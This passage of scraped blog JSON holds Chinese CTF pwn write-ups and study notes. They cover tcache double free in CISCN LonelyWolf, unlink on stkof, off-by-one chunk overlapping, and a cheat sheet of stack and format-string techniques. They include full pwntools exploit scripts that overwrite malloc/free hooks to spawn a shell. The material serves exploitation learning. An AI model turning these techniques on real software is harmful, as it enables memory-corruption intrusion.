0x7ffff7fff020gdb.attach(p)edit(6,p64(malloc_hook-35))add(b&#x27;1&#x27;*0x67)#7add(b&#x27;3&#x27;*0x67)#8add(b&#x27;\\x00&#x27;*67)edit(9,b&#x27;4&#x27;*19+p64(one_gadget))#9p.sendlineafter(b&quot;&gt; &quot;,b&#x27;1&#x27;)p.interactive() ​ 人有点麻。 ​","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"ciscn","slug":"ciscn","permalink":"https://fuurinko.github.io/tags/ciscn/"}]},{"title":"LonelyWolf","slug":"ciscn_2021_lonelywolf","date":"2022-04-06T12:19:37.401Z","updated":"2022-09-23T05:34:15.730Z","comments":true,"path":"2022/04/06/ciscn_2021_lonelywolf/","link":"","permalink":"https://fuurinko.github.io/2022/04/06/ciscn_2021_lonelywolf/","excerpt":"","text":"overview​ 开始做一些ciscn了。 readd​ size不能大于0x78。 1234567ptr = malloc(size);if ( ptr )&#123; size_struct = size_1; content_struct = ptr;//蚌埠住了，每次都会把这个指针覆盖为最新分配的content ptr。这下idx直接报废。 puts(&quot;Done!&quot;); &#125; ​ size和content的buf在空间中是相邻的。 ​ 有一个值得注意的地方是，add的idx是可以指定的，并且在后面输入size的时候会覆盖idx。但是似乎意义不大。并且add的时候完全没有为不同的idx创建不同的chunk，所以这个程序其实很阴间，idx感觉就是一个烟雾弹。不管是这里的add还是后面的show，edit，都是默认编辑最近申请的chunk ptr。所以四舍五入我们只能完全控制一个chunk。 12345__printf_chk(1LL, &quot;Index: &quot;);__isoc99_scanf(&amp;dword_F44, &amp;size_1);__printf_chk(1LL, &quot;Size: &quot;);__isoc99_scanf(&amp;dword_F44, &amp;size_1);size = size_1; edit12345678910111213141516171819if ( content_struct ) &#123; __printf_chk(1LL, &quot;Content: &quot;); v0 = content_struct; if ( size_struct ) &#123; v1 = (char *)content_struct + size_struct; while ( 1 ) &#123; read(0, v0, 1uLL); if ( *v0 == &#x27;\\n&#x27; ) break; if ( ++v0 == v1 ) return __readfsqword(0x28u) ^ v4; &#125; *v0 = 0; &#125; &#125; &#125; ​ 当输入的地址递增到content_struct + size_struct，则终止输入。看似是没有堆溢出的。 show​ 12if ( !idx &amp;&amp; content_struct ) __printf_chk(1LL, &quot;Content: %s\\n&quot;, (const char *)content_struct); free12if ( !idx &amp;&amp; content_struct ) free(content_struct); ​ UAF。 动调​ ​ 申请一个chunk，再free，内存如图。比较常规。 加载符号表​ 这几个ciscn的题都比较鸡贼，需要自己找符号表加载，不然pwndgb都看不了heap等。 ​ 执行一下看看小版本，然后去网上找有debug符号的libc，把符号表扒下来加载到程序上就行。实在找不到编译好的就找源码编译一下。 ​ 这个版本还是蛮阴间的，根本找不到，老老实实编译了。 利用大致思路​ 先想一想大体的利用思路吧，首先got表肯定不能改，所以getshell应该是改malloc_hook或者free_hook 。因为有UAF，并且chunk的size限制得比较小，功能也比较完备，所以应该是改Tcache bin的fd，构造任意地址写，并将chunk分配至 hook。 ​ leak的话，因为前面分析过，整个程序只能控制一个chunk，所以我们甚至没有办法利用unsortedbin来leak。既然这样的话，可以利用到tcache特有的leak方式。就是劫持tcache结构管理堆块，将这个堆块的size覆盖，。（因为程序在add的时候限制了大小，所以需要通过这个渠道来申请超大chunk）。 ​ 回到题目本身，这个题之前一直没有认真做完，所以虽然完全不知道解法的细节，但是还是记得比较清楚，这个libc是有对于tcache double free的检测的，但是这个无奈这个程序的uaf漏洞实在过于强大，所以我们只需要把bk位覆盖成其他的什么垃圾数据就行。 ​ 为了修改malloc_hook为one_gadget或者其他什么东西，我们首先需要将fake chunk分配至保存chunk ptr的buf上，劫持chunk ptr，将其修改为malloc_hook，然后编辑chunk content为one_gadget。 ​ 所以在构造fake chunk前，我们肯定要leak buf的地址以及malloc_hook 的地址。 ​ 但是总感觉buf的addr并不好leak，所以能不能先leak malloc_hoook ,然后直接劫持tcache fd到malloc hook上呢。 tcache double free leak heap addr​ 刚刚说到在这个漏洞下，劫持tcache fd非常容易，绕过key的检测也非常容易。我们先add再free，然后把检测位bk edit成任意垃圾数据，然后就能够再次free它了。这样就形成了双向循环链表，我们只要show出它，就能获得heap addr。 123456789add(0,0x78)#idx0free()edit(0,b&#x27;a&#x27;*0x10)free()add(0,0x78)show()p.recvuntil(&quot;Content: &quot;)heap_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))log.success(&quot;heap_addr =&gt; &#123;&#125;&quot;.format(hex(heap_addr))) ​ break tcache structure to leak libc​ 获得heap地址后就能够算出tcache管理堆块的地址，接着就能够劫持tcache的管理堆块。 12345678910111213141516171819202122232425tcache_addr = heap_addr - 0x260edit(0,p64(tcache_addr + 0x10))#将tcache的fd改为tcache+0x10add(0,0x78)add(0,0x78)#申请对应地址的fake chunkgdb.attach(p)edit(0,b&#x27;a&#x27;*64)#修改tcache size为a。free()#free tcache fake chunkshow()p.recvuntil(&quot;Content: &quot;)data = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))malloc_hook = data - 0x70log.success(&quot;malloc_hook =&gt; &#123;&#125;&quot;.format(hex(malloc_hook)))libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]free_hook = libc_base + libc.symbols[&#x27;__free_hook&#x27;]log.success(&quot;free_hook =&gt; &#123;&#125;&quot;.format(hex(free_hook)))system_addr = libc_base + libc.symbols[&#x27;system&#x27;]log.success(&quot;system_addr =&gt; &#123;&#125;&quot;.format(hex(system_addr))) ​ 稍微调一下。下断点在改fd为tcache+0x10，再申请到对应chunk之后。 ​ 可以看到现在tcache管理chunk显示bin中有0xff个bin，这也是我们double free后必然的结果。 ​ ​ edit后，从chunk content开始的内存被覆盖为了垃圾数据。如果我们此时free这个堆会怎样呢？ ​ 可以看到，chunk的bk和fd位被修改为了一串地址。这串地址指向main_arena+96。 ​ 这样相当于我们已经leak 了libc，但是为什么这一串fd和bk会是指向main_arena呢？ ​ 其实不难想。 ​ 看到这个指向main_arena的偏移时，其实大概就会意识到这其实就是unsortedbin leak。我们先前将tcache管理chunk的idx覆盖为了垃圾数据，相当于将整个tcache结构破坏了。所以此时如果我们在pwndbg中查看tcache bin的情况，会发现tcache的每一个thread的chunk都已经被填满了。 ​ 所以相当于此时已经没有tcache了。 ​ 当我们free这个堆块，就相当于free一个size为251的chunk，自然会被放入unsorted bin。后面的leak也就理所应当了。 allocate to free_hook​ 当leak了地址，我们可以再次覆盖chunk fd，分配chunk至free_hook,并将其改为system()。 因为tcache结构已经完全破坏了，所以就直接fastbin double free来修改fd就好了。 12345678910111213add(0,0x40)free()#free_hook = 0x12345678edit(0,p64(free_hook))add(0,0x40)add(0,0x40)edit(0,p64(system_addr))gdb.attach(p)add(0,0x40)edit(0,&quot;/bin/sh;&quot;)free()#getshellp.interactive() 6291598289251616072 exp：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *libc = ELF(&quot;./libc-2.27.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process([&quot;./lonelywolf&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;./libc-2.27.so&quot;&#125;)addr = 0x12345678def add(idx,size): p.recvuntil(&quot;Your choice: &quot;) p.sendline(&#x27;1&#x27;) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx)) p.recvuntil(&quot;Size: &quot;) p.sendline(str(size))def edit(idx,data): p.recvuntil(&quot;Your choice: &quot;) p.sendline(str(2)) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx)) p.recvuntil(&quot;Content: &quot;) p.sendline(data)def show(): p.recvuntil(&quot;Your choice: &quot;) p.sendline(str(3)) p.recvuntil(&quot;Index: &quot;) p.sendline(str(0))def free(): p.recvuntil(&quot;Your choice: &quot;) p.sendline(str(4)) p.recvuntil(&quot;Index: &quot;) p.sendline(str(0))add(0,0x78)#idx0free()edit(0,b&#x27;a&#x27;*0x10)free()add(0,0x78)show()p.recvuntil(&quot;Content: &quot;)heap_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))log.success(&quot;heap_addr =&gt; &#123;&#125;&quot;.format(hex(heap_addr)))tcache_addr = heap_addr - 0x260edit(0,p64(tcache_addr + 0x10))add(0,0x78)add(0,0x78)edit(0,b&#x27;a&#x27;*64)free()show()p.recvuntil(&quot;Content: &quot;)data = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))malloc_hook = data - 0x70log.success(&quot;malloc_hook =&gt; &#123;&#125;&quot;.format(hex(malloc_hook)))libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]free_hook = libc_base + libc.symbols[&#x27;__free_hook&#x27;]log.success(&quot;free_hook =&gt; &#123;&#125;&quot;.format(hex(free_hook)))system_addr = libc_base + libc.symbols[&#x27;system&#x27;]log.success(&quot;system_addr =&gt; &#123;&#125;&quot;.format(hex(system_addr)))add(0,0x40)free()#free_hook = 0x12345678edit(0,p64(free_hook))add(0,0x40)add(0,0x40)edit(0,p64(system_addr))gdb.attach(p)add(0,0x20)edit(0,&quot;/bin/sh;&quot;)free()p.interactive() 总结​ 这道题算做完了，还是因为之前没有怎么做过tcache的题，所以并不是很熟悉，所以算是学到了新知识，包括破坏tcache结构以及绕过tcache的key检测。不过这些方法都是因题而异的，不过确实拓宽了眼界。 ​","categories":[{"name":"HEAP - Tcache","slug":"HEAP-Tcache","permalink":"https://fuurinko.github.io/categories/HEAP-Tcache/"}],"tags":[{"name":"ciscn","slug":"ciscn","permalink":"https://fuurinko.github.io/tags/ciscn/"}]},{"title":"stack知识点总结","slug":"sum_stack_summary","date":"2022-04-05T16:00:00.000Z","updated":"2022-04-15T07:12:48.384Z","comments":true,"path":"2022/04/06/sum_stack_summary/","link":"","permalink":"https://fuurinko.github.io/2022/04/06/sum_stack_summary/","excerpt":"","text":"stack控制程序执行流栈溢出ret2syscall​ 利用程序自带的gadget，构造syscall。 ​ 对应板子 ret2libc/csu​ 比较模版化，值得一题的就是，system()的执行要求此时栈是16位对齐的，所以如果getshell失败不妨多ret一次。 ret2shellcode​ 在rwx的内存空间(不一定是栈）上写shellcode，其实利用的姿势挺多的，建议看看pwn.college的ShellcodeInjection module，会刷新世界观。 ​ 普通的ret2shellcode一般要求我们leak输入的buf以跳转回去执行，但是还是因题而异，有的题还会对输入或者说要执行的shellcode进行过滤，反正花样挺多。 srop​ 提供了一种相对更加高级的rop方式，但是据我的经验一般srop能做普通rop也能做，只是相对来说exp更短。如果一定要srop的话，pwntools的srop模块会是一个很好的选择。 ret2dlreslove​ 当程序没有任何输出时，可以考虑这个利用方式。 ​ 利用其实虽然复杂，原理比较好理解，简单的题也还是不难的。 ​ 无relro的情况只需要伪造.dynamic节中字符串表地址为目的地址就行。比如将read()字符串替换为system()字符串，然后读入&quot;/bin/sh&quot; ​ partial relro使得.dynamic只读，那么就需要伪造重定位表。 ​ full relro的话，就更加困难了，是需要利用到dt_bug找到link_map，再通过link_map找到dl_runtime_resolve函数的地址，然后再进行常规的利用。相当之复杂。 ret2vsyscall​ 当pie开启，我们如果能控制程序执行流，但是没有合适的gadget调整栈帧的话，可以利用位置不受pie影响的vsyscall作为ret gadget使用。 ​ vsyscall在程序中地址是固定的0xffffffffff600000-0xffffffffff601000,一般使用0xffffffffff600007等。 泄露内存格式化字符串泄露任意地址123456--------获取栈变量对应的地址------------%n$p #输出栈上第n+1个格式化字符串输出参数--------获取栈变量对应的字符串----------%n$s#输出栈上第n+1个格式化字符串参数对应的字符串--------获取任意地址内容---------------addr%n$s Extra:​ 对于格式化字符串地址偏移的计算，32位和64位并不完全相同，32位参数完全由栈传递，所以参数在栈上出现的位次即是偏移（要减去返回地址占的位次），但是64位传参前六位是由寄存器传参，因此在栈上找到的偏移需要加6。 数组越界​ 对数组的idx进行非法的索引，以输出相应内存中的数据。 覆盖空字节​ 输入或者其他操作时，将字符串结尾的截断空字节覆盖，输出时则会无视截断持续输出，有可能造成内存泄露。这一点在堆题中同样非常好用，尤其是有时候输出字符串与堆结构体的地址相邻。 修改内存格式化字符串利用fmt_payload模块自动化写入1payload = fmtstr_payload(offset, &#123;func_got : system_addr&#125;) 手工构造原理%n参数不输出字符，但是把已成功输出的字符个数写入对应整形指针参数所指的变量。 1addr%k$n#k为格式化字符串偏移，addr为需要覆盖的地址 12%hhn #向地址写入单字节%hn #向地址写入双字节","categories":[{"name":"Generalization","slug":"Generalization","permalink":"https://fuurinko.github.io/categories/Generalization/"}],"tags":[{"name":"summary","slug":"summary","permalink":"https://fuurinko.github.io/tags/summary/"}]},{"title":"UNLINK","slug":"heap_learning_unlink","date":"2022-04-04T16:00:00.000Z","updated":"2022-04-09T08:30:01.347Z","comments":true,"path":"2022/04/05/heap_learning_unlink/","link":"","permalink":"https://fuurinko.github.io/2022/04/05/heap_learning_unlink/","excerpt":"","text":"0:​ 还是一个旧的笔记的内容增加以及纠错。这篇我也不记得是什么时候写的了，也是半年前吧。 UNLINKunlink大致概念​ 就是将free chunk从双向循环链表中解链的过程，具体触发这个过程的操作比较常见的有与当前物理相邻的chunk合并的过程等。因为是双向链表，自然已经超出了fastbin的范围，一般申请的chunk也要大于0x60了。 ​ 在ptmalloc中unlink的代码简化来看就是： 123456#小写的指fd和bk位，大写指前/后chunk bpFD=P-&gt;fd #后一个chunk bp = 当前chunk的fd，BK=P-&gt;bk# #前一个chunk bp = 当前chunk的bk，相当于赋值。 FD-&gt;bk =P-&gt;bk #后一个chunk的bk位 = 当前chunk的bk，也就是后一个chunk的bk等于前一个chunk的 bpBK-&gt;fd = P-&gt;fd #前一个chunk的fd = 后一个chunk的bp ​ ​ （在这里我一直忽略一个很重要的点，就是p-&gt;fd是一个指针，保存了FD_prevsize的地址，bk同理，于是在unlink时，FD-&gt;bk=BK，其中 FD-&gt;bk的地址是p-&gt;fd+12，但是实际unlink需要的是将这个地址的内容替换为BK，所以应该是*(p-&gt;fd + 12)=BK而不是是(p-&gt;fd + 12)=BK ​ 所以在比较远古的版本中，由于glibc没有给unlink做什么检查，导致我们那可以伪造unlink时与前/后连接的chunk，导致申请到伪造的chunk。 ​ 古早的unlink利用​ ps：有一些内容是参照我之前第一次学习时做的笔记。 ​ 刚才说到，unlink的操作是将前一个chunk的bk指针指向后一个chunk，后一个chunk的fd指针指向前一个chunk，我们可以选择通过控制后一个chunk的指针来篡改本来要连接的对象。 ​ 举一个例子，如果有两个物理地址连续的small chunk0和small chunk1（这里chunk size必须要大于fastbin，因为fastbin chunk就只是将chunk放进fastbin链表中管理，并且为了效率，每个chunk的prev_inuse位都没有修改，在链表中也不会进行合并），前一个chunk0是allocated，后一个chunk1是free，这时候如果我们释放chunk0，由于两个chunk都是free状态，所以ptmalloc判断两个chunk需要合并，于是首先需要把chunk1从双向循环链表中拿出来与chunk0合并，合并之后再放回去。 ​ 这时我篡改chunk0的bk指针指向一个我们希望的target_addr的bp，再将target_addr+8改成chunk0的bp。这样在unlink的时候，实际连接的就是chunk0与target_addr，chunk1就被忽略掉了。 ​ 但是在实际的利用中，这样需要修改两个chunk。或者说两个内存块，未免有些麻烦，注意到unlink的操作之前是有一个类似“赋值”的操作的，这里是不是也能够作为攻击的切入点？ ​ FD=P-&gt;fd;BK=P-&gt;bk;FD-&gt;bk = BK;BK-&gt;fd = FD，其实前面的两步虽然不是实际的unlink的操作，但是也十足关键，这两个操作判定了前后chunk的bp，可以说后面unlink操作都是基于前面两步指定的指针来进行的，所以我们只需要把目光投向当前chunk的fd和bk位，修改它们，就相当于同时修改了前一个chunk和target chunk。 ​ 那么还是之前举的例子，我们不修改chunk0或target chunk，而是修改chunk1本身。 ​ 我们最终的目的还是希望能够通过一个libc函数+参数的形式，执行某些特定的函数。所以我们希望利用unlink修改函数的got表。 ​ 比如说为了show某些地址，改free got为puts got，为了getshell，改atoi got为system got。 ​ 要修改got表，一个通用的步骤，是先在chunk content上填上got addr，然后将chunk content作为一个指针，分配chunk content指向的内存块，也就是got，再利用edit或者其他东西修改这个内容。 ​ 比如我们首先需要伪造一个show的功能，就需要将某个函数的got替换成puts（已经包含的任意输出函数，哦，其实常见的只有puts和printf），比如说经典受害人free（）。 ​ 那么又该如何实现这样的效果？ ​ 我们可以在FD=P-&gt;fd这一步时将fd赋值为某个got addr -12（这是一个got表值的地址）。然后在BK=P-&gt;bk时给bk赋一个值，比如说system got（这是一个got表值），然后unlink时，FD-&gt;bk = BK，会先找到FD的地址，也就是got addr - 12，然后找到FD的bk指针，也就是got addr -12 + 12（32位），再解引用，使得找到的FD-&gt;bk的地址对应的内存块的值为BK，也就是我们刚刚篡改过的got的值，这样就成功了。用数据结构的语言描述相对比较抽象，下面具体一点讲在题目中的利用思路。 unlink题目利用思路​ 虽然解题的细节因题而异，但是思路万变不离其宗。 ​ 之间也总结过，就是像这类改指针的题目，无非就是两层指针关系。地址A指向地址B，地址B指向地址C，通常我们为了改地址C的内容，就需要通过地址A修改地址B。 ​ 而在通常的堆题中，结构体中的指针就是这个地址B，我们利用伪造的指针来修改地址B，使其指向目标地址，在edit或者其他操作的时候，将地址B指向的区域修改。而一般解题的关键，就是如何控制地址A和地址B的关系。 无检测​ 在unlink中，我们选择构造一个fake free chunk（这个fake chunk自己的位置并不是太重要），接着给这个fake free chunk填上假的fd和bk。先不用管，free掉前一个chunk，由于前一个chunk和我们刚刚构造的fake chunk都被判定为free，所以需要合并，此时就需要将fake chunk从假的双向循环链表中unlink，进行的操作就是，前一个chunk ptr = fake chunk fd，后一个chunk ptr = fake chunk bk，前一个chunk的bk，也就是我们刚刚篡改的fake chunk fd + 0x18 = 后一个chunk ptr，也就是fake chunk bk。 ​ 因此这个假的fd和bk就是整个unlink的关键。 ​ 我们想要实现比如got表的修改，可以将fake fd和fake bk分别填为got addr和got值，unlink成功的话就能实现*(got addr ) = got 有检测例子stkof检查文件：​ ​ 64位动态链接文件，没开PIE，问题不大。got表可写，可以尝试改一改。 逆向edit123456ptr = (&amp;::s)[v2];for ( i = fread(ptr, 1uLL, size, stdin); i &gt; 0; i = fread(ptr, 1uLL, size, stdin) )&#123; ptr += i; size -= i;&#125; ​ 这里因为输入的size的大小是任意的，就意味着我们能够向chunk中读入无限制的数据，导致堆溢出。 add12(&amp;::s)[++head] = chunk_ptr;printf(&quot;%d\\n&quot;, (unsigned int)head); ​ 这里会将content的指针保存在heap结构体中。也可以理解为heap结构体中只有一个ptr字段。 free12free((&amp;::s)[idx]);(&amp;::s)[idx] = 0LL; ​ 这里虽然将结构体中保存的ptr置零，但是chunk ptr本身没有被置0，还是存在可以利用的uaf。 put_TODO?​ 还有这个不知道是干嘛的函数，我觉得唯一可能的意义就是调用puts，拿来改点表啥的。 1234if ( strlen((&amp;::s)[idx]) &lt;= 3 ) puts(&quot;//TODO&quot;); else puts(&quot;...&quot;); 漏洞利用思路大致的疑思​ 整理一下。还是菜单题，增删改，没有查。改没有限制输入字符的长度，存在堆溢出，查的话需要我们自己改got表然后泄露数据。 ​ libc还是2.23，没有对于unlink的检测，因此相对来说其实不难。 ​ 在分析之前，稍微想一下如何确定这道题的利用方式是unlink。看到UAF漏洞，其实对应的利用方式有很多，比较常见的就有unlink和fastbinattack，但是为什么是unlink而不利用fastbin呢？ ​ 如果这是一个fastbin attack，那么估计也就是house of spirit的题型。我们需要在got addr附近伪造一个fake chunk，先不管target addr地址的合法性，我们直接考虑如何覆盖fastbin的fd，稍微想一想就发现不实际，因为我们倘若要完成整个步骤，目标需要修改的ptr必须是结构体中保存的ptr，而这个指针在free时已经被置0了，因此不可能利用fastbin attack。于是需要反过来说明unlink的合理性。unlink可以被利用的关键在于chunk的伪造是在free之前的，首先在next chunk上布置好fake chunk，然后free，就已经完成了利用，不用再考虑其他什么指针操作了。 ​ 回到题目本身，首先，因为程序没有设置取消缓冲区，所以在我们输入东西，实际分配chunk之前，程序还会申请一堆chunk用于缓冲，所以为了不影响调试，需要先申请一个大chunk来把这些缓冲区申请了。 ​ 因为有uaf，并且可以改got，所以这道题的思路大致是通过unlink改got表然后调用system(&quot;/bin/sh&quot;)来getshell。对于libc的leak，因为没有show函数，所以需要先利用改got表的方式伪造一个puts()。 具体思路​ 在构造任意地址写之前，可以先尝试leak libc。 ​ 第一步需要将free()的got表修改为puts()的got表，这一步我们需要在free got addr处填入puts plt。 ​ 在前面介绍unlink利用时，举的例子就是利用unlink改表，那么这种方式能不能用在这道题上呢？ ​ 先申请三个chunk，第一个chunk用来填缓冲区，意义不大，第二个chunk用来触发unlink，第三个chunk用来被修改fd和bk。首先非常自然地想到，将chunk3的fd改为free got addr - 0x18，bk改为puts plt。 ​ 稍微往后想一下，这样unlink了之后。p-&gt;bk就被完全破坏了，我们只是获得了一个puts函数，但是我们还需要将atoi gots改为system，这样做就无法故技重施了，未免有些破釜沉舟。 ​ 不妨使用一些更加精妙的技巧。我们没有必要更改chunk的ptr本身，由于heap结构体中保存了指向chunk content的指针，所以如果我们能伪造一个fake chunk到heap结构体处，就能修改每个heap的content指针，也就是对应的chunk ptr为不同函数的got表，这样当我们修改chunk content时，就相当于修改了函数的got表内容了。 ​ 所以目前的问题是如何伪造一个fake chunk到heap结构体处。 ​ ​ 思路就是利用堆溢出漏洞，将chunk2的fd修改为heap2 - 0x18，这样当unlink时，FD= p -&gt;fd = heap2 - 0x18，相当于chunk2前一个chunk是在heap2 - 0x18的位置，然后FD-&gt;bk = BK，也就是heap2 = BK。这里有两种理解的方式，一种是fake chunk的ptr位于heap2的位置。所以我们能够编辑chunk2（实则是编辑fake chunk）来修改heap结构体储存的chunk ptr。 ​ 这样我们就可以修改heap[0]为free got，1为puts got，2为atoi got，然后edit chunk0，将内容编辑为puts的plt表（因为此时chunk0的ptr指针已经被修改为free的got表地址了） ​ 这样我们就获得了puts函数。这时我们puts（1），就能获得chunk1的实际ptr地址，注意这时候这个实际ptr就是puts的got表值，这样我们就可以进行rop获得system的真实地址了。 ​ 然后利用类似的步骤将atoi的got表覆盖为system的got表，最后只要发送&quot;/bin/sh&quot;就能getshell。 实际利用​ 首先连续申请三次个chunk。chunk大小至少是small。 123add(0x100)#1 填充缓冲区add(0x30)#2 free它来触发unlinkadd(0x80)#3 构造fake chunk，完成利用。 ​ 利用edit功能，将chunk2伪造成一个free fake chunk。 12345678910#forge fake chunkpayload = p64(0) #prev_sizepayload += p64(0x20) #size,fake free binpayload += p64(head + 16 - 0x18) #fake chunk fdpayload += p64(head + 16 - 0x10) #fake chunk bkpayload += p64(0x20) # next chunk&#x27;s prev_size to bypass the checkpayload = payload.ljust(0x30, b&#x27;a&#x27;)# paddingpayload += p64(0x30)# Next_chunk&#x27;s prev_size field. Make it believe that prev chunk is freepayload += p64(0x90)# Next_chunk&#x27;s size fieldedit(2,0x40, payload) ​ ​ 这一段最关键的就是这两句，其他都是为了绕过检测的一些小细节。 12payload += p64(head + 16 - 0x18) #fdpayload += p64(head + 16 - 0x10) #bk ​ 当unlink时，操作如下： 123FD -&gt; bk = BK =&gt; head + 16 = head + 16 - 0x10BK -&gt; fd = FD =&gt; head + 16 -0x10 + 0x10 =*（ head + 16） = head +16 -0x18 ​ 其实就是在head +16（这是一个地址）处填入了head +16 -0x18的内容。 ​ 然后非常有趣的是（也是精心构造的结果），head + 16指向的内容正好就是chunk2 content ptr，也就是相当于这个操作使得chunk2 content ptr被修改为了head+16-0x18，所以当我们edit chunk2，我们的输入会在head+16-0x18指向的地方，也就是head-0x8这个地址。 ​ 所以我们就可以随便覆盖head了。先用八个字节填充到head地址上，再将每个head指针都改为需要的got的地址，这样当我们edit对应的heap的时候，就会在对应的got地址上写入数据。 1234payload = b&#x27;a&#x27;*8 + p64(free_got_addr)#head0 to free got addrpayload += p64(puts_got_addr)#head1 to puts got addrpayload += p64(atoi_got_addr)#head2 to atoi got addredit(2,len(payload),payload) ​ 这时候我们编辑head0，在free got addr处写入puts的plt，这样free一个heap就相当于打印，正好heap被我们改成了got表地址，就相当于打印got表了。最后我们可以用相似的方法将atoi( )的got改为system地址，最后getshell。 123456789edit(0,8,p64(puts_plt))free(1)puts_addr = u64(p.recv(8))log.success(&quot;puts_addr =&gt; &#123;&#125;&quot;.format(hex(puts_addr)))system_addr = puts_addr - (libc.symbols[&#x27;puts&#x27;] - libc.symbols[&#x27;system&#x27;])log.success(&quot;system_addr =&gt; &#123;&#125;&quot;.format(hex(system_addr)))edit(2,8,p64(system_addr))p.send(&quot;/bin/sh&quot;) ​ ​ ​ ​ 参考hitcon14_stkof","categories":[{"name":"HEAP - Unlink","slug":"HEAP-Unlink","permalink":"https://fuurinko.github.io/categories/HEAP-Unlink/"}],"tags":[{"name":"learning","slug":"learning","permalink":"https://fuurinko.github.io/tags/learning/"}]},{"title":"off by one /chunk overlapping","slug":"heap_leaarning_off by one","date":"2022-04-03T16:00:00.000Z","updated":"2022-04-10T08:08:53.369Z","comments":true,"path":"2022/04/04/heap_leaarning_off by one/","link":"","permalink":"https://fuurinko.github.io/2022/04/04/heap_leaarning_off%20by%20one/","excerpt":"","text":"0​ 这篇笔记最早是在大概21年的11月开始的，当时其实也是抱着复习的心理去写的，毕竟堆题在完全吃透之前，只要不是经常做题，那么就基本是学了就忘的状态。更别说我这种就没怎么做题的人。 ​ 现在是2022年四月，我看着这篇笔记，只觉得当时那些卡了很久的点，实在过于愚蠢，完全无法理解当时自己为什么会这么想。这些困难点大多源于我看代码不仔细，以及对于指针操作的一些不理解，或者说对于chunk结构的不熟悉。 ​ 并且那个时候写wp的思路完全是走一步看一步，没有大体getshell的思路，没有整体题目的逆向，关于漏洞点的分析，和如何leak 内存，或者修改内存，最终getshell的大纲，就是纯纯照着wp瞎写，wp怎么想我也怎么想，现在想来真的很蠢，我现在终于知道我21年下半年在干什么了，在无穷尽的摆烂享乐和陷于差劲学习方式带来的痛苦的自我感动之中，真的烂透了。 ​ 所以我把那些可笑的内容全部删除并增加了新的内容与思考，算是第二次复习吧。 概念​ 单/空字节溢出攻击。 ​ 通常来说简单的off by one的漏洞点来自于编写时对边界控制不严格，导致每次输入的字符都能比规定的最大字符大那么一些（一个，或者几个）。这些字节溢出到物理地址相邻的下一个堆块，就能修改下一个chunk的size或者prev_inuse，通过这样的溢出，就能够构造一些有趣的攻击。 ​ 通常单字节溢出的利用方式有如下几种： 溢出任意可控制字节：修改chunk size，造成堆叠，泄露或覆盖其他块的数据 溢出空字节：修改下一个chunk的prev_inuse，使得当前chunk状态为free，然后就可以：1）利用unlink进行攻击。2）对于下一个chunk来说，前一个chunk状态为free，自身的prev_size域启用，就能够伪造prev_size，改变前一个chunk的size，造成堆叠。 ​ ​ 从ctf-wiki上的一个简单的小例子开始： 123456789101112131415161718int my_gets(char *ptr,int size)&#123; int i; for(i=0;i&lt;=size;i++)#栅栏错误 &#123; ptr[i]=getchar(); &#125; return i;&#125;int main()&#123; void *chunk1,*chunk2; chunk1=malloc(16); chunk2=malloc(16); puts(&quot;Get Input:&quot;); my_gets(chunk1,16); return 0;&#125; 可以看到0x1994020的最低位被覆盖为了a。当然这里是因为前一个chunk属于已分配状态，所以下一个chunk的prev_size被内存复用为了前一个chunk的内容。 字符串操作则同理。 offbyone利用方式chunk overlapping​ off by one的一个比较简单的利用就是chunk overlapping，简单讲就是通过溢出将chunk的prev_size位修改，导致几个连续的chunk的内存空间发生了重叠，借此可以泄露一些数据或者覆盖chunk指针。 ​ 在举例子之前先复习一下与chunk size有关的一些操作。 ​ 获取当前chunk size ：通过堆指针的直接获取size位 ​ 获取当前chunk的use状态：通过当前chunk_bp+chunk_size获取下一个chunk的bp，然后获得prev_inuse位。 ​ 获取前一个chunk size ：利用当前chunk指针获取当前chunk的prev_size。 ​ 获取下一个chunk的地址 ：利用当前chunk的size，下一个chunk地址即为：当前chunk指针+size。 ​ 获取前一个chunk的信息：先通过prev_size算出前一个chunk的堆指针，然后再利用前一个chunk的对指针来获得相关信息。 例1:HITCON Trainging lab13题目链接 overview patial retro,无pie。 readd1*(&amp;heaparray + i) = malloc(0x10uLL); ​ 首先申请10大小的chunk作为note结构体的指针。 ​ 然后申请size+8大小的chunk，在*(&amp;heaparray + i) + 1输入content并把size储存在*(&amp;heaparray + i)。 123*(_QWORD *)*(&amp;heaparray + i) = size;printf(&quot;Content of heap:&quot;);read_input(*((_QWORD *)*(&amp;heaparray + i) + 1), size); edit1read_input(*((_QWORD *)*(&amp;heaparray + v1) + 1), *(_QWORD *)*(&amp;heaparray + v1) + 1LL); ​ edit()中，可以输入的字符比规定的多了一个字节。 show打印也是多输出一个字节 1printf(&quot;Size : %ld\\nContent : %s\\n&quot;, *(_QWORD *)*(&amp;heaparray + v1), *((const char **)*(&amp;heaparray + v1) + 1)); free123free(*((void **)*(&amp;heaparray + v1) + 1));free(*(&amp;heaparray + v1));*(&amp;heaparray + v1) = 0LL; 首先释放chunk struct chunk，再释放chunk content chunk，没有什么大问题。 利用​ 程序并没有其他非常规的操作，就是单纯的off by one+chunk overlapping的利用。所以按照常规的思路走，既可以改got表，也有完备的leak功能，就先利用off by one leak 内存，再通过堆叠修改note结构中的指针为free got addr。 ​ 由于我们只能溢出一个字节，我们的希望把last chunk的size更改至能够包含下一个chunk的空间，比如说last chunk size为0x10，next chunk为0x8，那么改last chunk为0x40，next chunk其实就被包含在了last chunk的content范围中，正好next chunk的结构中含有chunk ptr，所以我们可以通过edit last chunk 的content实现对于next chunk ptr的更改，打印。 ​ 溢出chunk1 structure chunk size​ 首先溢出一个字节，将lastchunk的size更改 ​ 